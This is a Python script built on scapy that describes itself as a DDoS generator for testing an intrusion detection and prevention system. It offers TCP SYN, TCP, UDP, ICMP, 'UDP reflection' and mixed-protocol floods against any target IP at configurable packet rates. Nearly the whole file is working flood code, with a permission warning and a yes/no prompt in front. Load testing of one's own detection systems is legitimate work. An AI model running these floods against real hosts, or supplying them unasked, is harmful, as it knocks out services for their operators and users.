#!/usr/bin/env python3
"""
DDoS Attack Testing Script
Generates different types of DDoS attacks for testing the IDPS system

Usage:
    sudo python3 scripts/test_ddos_attacks.py --attack-type tcp_syn --target 192.168.1.100 --duration 30
"""

import argparse
import time
import random
from scapy.all import IP, TCP, UDP, ICMP, send, Raw
import sys

class DDoSAttackGenerator:
    """Generate different types of DDoS attacks for testing"""
    
    def __init__(self, target_ip: str, target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port
    
    def tcp_syn_flood(self, duration: int = 30, rate: int = 1000):
        """Generate TCP SYN flood attack"""
        print(f"[*] Starting TCP SYN Flood attack on {self.target_ip}:{self.target_port}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} packets/sec")
        
        start_time = time.time()
        packet_count = 0
        
        try:
            while time.time() - start_time < duration:
                packet = IP(dst=self.target_ip)/TCP(dport=self.target_port, flags="S")
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    elapsed = time.time() - start_time
                    pps = packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Sent {packet_count} packets ({pps:.1f} pps)")
                
                time.sleep(1.0 / rate)
        
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        print(f"[*] Total packets sent: {packet_count}")
    
    def tcp_flood(self, duration: int = 30, rate: int = 2000):
        """Generate high-volume TCP flood attack"""
        print(f"[*] Starting TCP Flood attack on {self.target_ip}:{self.target_port}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} packets/sec")
        
        start_time = time.time()
        packet_count = 0
        ports = [80, 443, 8080, 22, 21]
        
        try:
            while time.time() - start_time < duration:
                port = random.choice(ports)
                packet = IP(dst=self.target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 2000 == 0:
                    elapsed = time.time() - start_time
                    pps = packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Sent {packet_count} packets ({pps:.1f} pps)")
                
                time.sleep(1.0 / rate)
        
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        print(f"[*] Total packets sent: {packet_count}")
    
    def udp_flood(self, duration: int = 30, rate: int = 2500):
        """Generate UDP flood attack"""
        print(f"[*] Starting UDP Flood attack on {self.target_ip}:{self.target_port}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} packets/sec")
        
        start_time = time.time()
        packet_count = 0
        
        try:
            while time.time() - start_time < duration:
                packet = IP(dst=self.target_ip)/UDP(dport=self.target_port)/Raw(load="A"*100)
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 2000 == 0:
                    elapsed = time.time() - start_time
                    pps = packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Sent {packet_count} packets ({pps:.1f} pps)")
                
                time.sleep(1.0 / rate)
        
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        print(f"[*] Total packets sent: {packet_count}")
    
    def udp_reflection(self, duration: int = 30, rate: int = 1500):
        """Generate UDP reflection attack (many destination ports)"""
        print(f"[*] Starting UDP Reflection attack on {self.target_ip}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} packets/sec")
        print(f"[*] Using random destination ports (100+)")
        
        start_time = time.time()
        packet_count = 0
        
        try:
            while time.time() - start_time < duration:
                # Use many different ports to simulate reflection attack
                port = random.randint(1, 65535)
                packet = IP(dst=self.target_ip)/UDP(dport=port)/Raw(load="A"*50)
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 2000 == 0:
                    elapsed = time.time() - start_time
                    pps = packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Sent {packet_count} packets ({pps:.1f} pps)")
                
                time.sleep(1.0 / rate)
        
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        print(f"[*] Total packets sent: {packet_count}")
    
    def icmp_flood(self, duration: int = 30, rate: int = 1500):
        """Generate ICMP flood attack (ping flood)"""
        print(f"[*] Starting ICMP Flood attack on {self.target_ip}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} packets/sec")
        
        start_time = time.time()
        packet_count = 0
        
        try:
            while time.time() - start_time < duration:
                packet = IP(dst=self.target_ip)/ICMP()
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 2000 == 0:
                    elapsed = time.time() - start_time
                    pps = packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Sent {packet_count} packets ({pps:.1f} pps)")
                
                time.sleep(1.0 / rate)
        
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        print(f"[*] Total packets sent: {packet_count}")
    
    def mixed_protocol(self, duration: int = 30, rate: int = 2000):
        """Generate mixed protocol attack (TCP, UDP, ICMP)"""
        print(f"[*] Starting Mixed Protocol attack on {self.target_ip}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} packets/sec")
        print(f"[*] Using TCP, UDP, and ICMP protocols")
        
        start_time = time.time()
        packet_count = 0
        
        try:
            while time.time() - start_time < duration:
                protocol = random.choice(['tcp', 'udp', 'icmp'])
                
                if protocol == 'tcp':
                    packet = IP(dst=self.target_ip)/TCP(dport=random.randint(1, 65535), flags="S")
                elif protocol == 'udp':
                    packet = IP(dst=self.target_ip)/UDP(dport=random.randint(1, 65535))
                else:  # icmp
                    packet = IP(dst=self.target_ip)/ICMP()
                
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 2000 == 0:
                    elapsed = time.time() - start_time
                    pps = packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Sent {packet_count} packets ({pps:.1f} pps)")
                
                time.sleep(1.0 / rate)
        
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user")
        
        print(f"[*] Total packets sent: {packet_count}")


def main():
    parser = argparse.ArgumentParser(
        description="Generate DDoS attacks for IDPS testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types:
  tcp_syn        - TCP SYN flood (targets single port)
  tcp_flood      - High-volume TCP flood (multiple ports)
  udp_flood      - UDP flood attack
  udp_reflection - UDP reflection (many destination ports)
  icmp_flood     - ICMP ping flood
  mixed          - Mixed protocol attack (TCP/UDP/ICMP)

Examples:
  sudo python3 scripts/test_ddos_attacks.py --attack-type tcp_syn --target 192.168.1.100
  sudo python3 scripts/test_ddos_attacks.py --attack-type udp_flood --target 10.0.0.50 --duration 60
  sudo python3 scripts/test_ddos_attacks.py --attack-type mixed --target 192.168.1.100 --rate 3000
        """
    )
    
    parser.add_argument(
        '--attack-type', '-t',
        required=True,
        choices=['tcp_syn', 'tcp_flood', 'udp_flood', 'udp_reflection', 'icmp_flood', 'mixed'],
        help='Type of DDoS attack to generate'
    )
    
    parser.add_argument(
        '--target', '-d',
        required=True,
        help='Target IP address'
    )
    
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=80,
        help='Target port (default: 80)'
    )
    
    parser.add_argument(
        '--duration', '-D',
        type=int,
        default=30,
        help='Attack duration in seconds (default: 30)'
    )
    
    parser.add_argument(
        '--rate', '-r',
        type=int,
        default=None,
        help='Packets per second (default: attack-specific)'
    )
    
    args = parser.parse_args()
    
    # Set default rates if not specified
    default_rates = {
        'tcp_syn': 1000,
        'tcp_flood': 2000,
        'udp_flood': 2500,
        'udp_reflection': 1500,
        'icmp_flood': 1500,
        'mixed': 2000
    }
    
    rate = args.rate if args.rate else default_rates[args.attack_type]
    
    # Warning
    print("=" * 60)
    print("⚠️  WARNING: This script generates DDoS attacks for testing")
    print("⚠️  Only use on systems you own or have permission to test")
    print("=" * 60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack Type: {args.attack_type}")
    print(f"Duration: {args.duration}s")
    print(f"Rate: ~{rate} packets/sec")
    print("=" * 60)
    
    # Confirm
    try:
        confirm = input("\nContinue? (yes/no): ")
        if confirm.lower() not in ['yes', 'y']:
            print("[*] Aborted")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\n[*] Aborted")
        sys.exit(0)
    
    # Generate attack
    generator = DDoSAttackGenerator(args.target, args.port)
    
    attack_methods = {
        'tcp_syn': generator.tcp_syn_flood,
        'tcp_flood': generator.tcp_flood,
        'udp_flood': generator.udp_flood,
        'udp_reflection': generator.udp_reflection,
        'icmp_flood': generator.icmp_flood,
        'mixed': generator.mixed_protocol
    }
    
    try:
        attack_methods[args.attack_type](args.duration, rate)
        print("\n[*] Attack completed")
    except PermissionError:
        print("\n[!] ERROR: Permission denied. Run with sudo/root privileges")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()

